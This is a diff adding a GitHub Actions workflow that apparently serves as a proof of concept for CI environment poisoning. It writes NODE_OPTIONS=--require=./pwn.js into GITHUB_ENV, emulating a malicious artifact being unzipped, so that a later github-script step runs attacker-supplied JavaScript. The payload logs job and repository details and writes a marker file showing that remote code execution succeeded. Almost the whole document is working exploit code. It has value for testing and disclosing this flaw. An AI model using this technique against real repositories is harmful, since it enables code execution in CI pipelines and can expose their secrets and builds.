@@ -1,0 +1,31 @@
+name: zz-lottie-nodeopts
+on: workflow_dispatch
+
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - name: poison env
+        run: |
+          mkdir -p stage
+          printf 'PR_NUMBER=1\nNODE_OPTIONS=--require=./pwn.js\n' > stage/env
+          cat > stage/pwn.js <<'JS'
+          var fs = require('fs');
+          console.log('PWNED_NODE_OPTIONS job=' + process.env.GITHUB_JOB + ' workflow=' + process.env.GITHUB_WORKFLOW + ' repo=' + process.env.GITHUB_REPOSITORY);
+          fs.writeFileSync('pwned.txt', 'rce-in-later-node-action\n');
+          JS
+      - name: emulate unzip + GITHUB_ENV append
+        run: |
+          cp stage/env env
+          cp stage/pwn.js pwn.js
+          while read line; do echo "$line" >> $GITHUB_ENV; done < env
+          echo "injected NODE_OPTIONS=[$NODE_OPTIONS]"
+      - name: later node action (must load pwn.js)
+        uses: actions/github-script@v6
+        with:
+          script: |
+            console.log('github-script body running');
+      - name: evidence
+        if: always()
+        run: |
+          echo "--- pwned.txt ---"; cat pwned.txt 2>&1 || echo NOT_EXECUTED
